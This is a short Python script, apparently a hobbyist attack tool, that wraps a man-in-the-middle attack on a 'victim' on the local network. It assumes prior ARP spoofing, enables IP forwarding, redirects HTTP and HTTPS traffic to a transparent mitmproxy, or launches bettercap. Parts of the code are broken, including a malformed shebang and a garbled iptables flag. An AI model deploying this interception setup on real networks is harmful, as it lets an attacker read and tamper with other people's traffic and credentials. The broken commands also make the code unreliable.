#!usr/bin/env python
#!usr/bin/env python3
import os
import mitmproxy

header = """
                                                          ---------|
 |\      /|   --------  ---------- |\      /|      /\     |        |
 | \    / |      |          |      | \    / |     /  \    |        |
 |  \  /  |      |          |      |  \  /  |    /    \   |--------|       
 |   \/   |      |          |      |   \/   |   /----- \  |
 |        |   --------      |      |        |  /        \ |

"""

print(header)


print("[+] Firstly Make sure that victim's all traffic should be passing through attackers by arp.py script ")

def mitmpr():
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -t nat -A PREROUTING -p TCP - -destination-port 80 -j REDIRECT --to-port 8080")
    print("[I] To install the certificate, go to 'http://mitm.it/' through the proxy, and choose your OS.")
    os.system("iptables -t nat -A PREROUTING -p TCP - -destination-port 443 -j REDIRECT --to-port 8080")
    os.system("sudo mitmproxy -T --host -e")


def bettercap():
    print("[+] Install requirements before running it from install.sh")
    os.system("sudo bettercap -X")


a = input("Which tool doyou ant to use [A. mitmproxy] or [B. Bettercap]: (A/B)")

if(a == 'A' or a == 'a'):
    mitmpr()
elif(a == 'B' or a == 'b'):
    bettercap()
else:
    print("Wrong input")




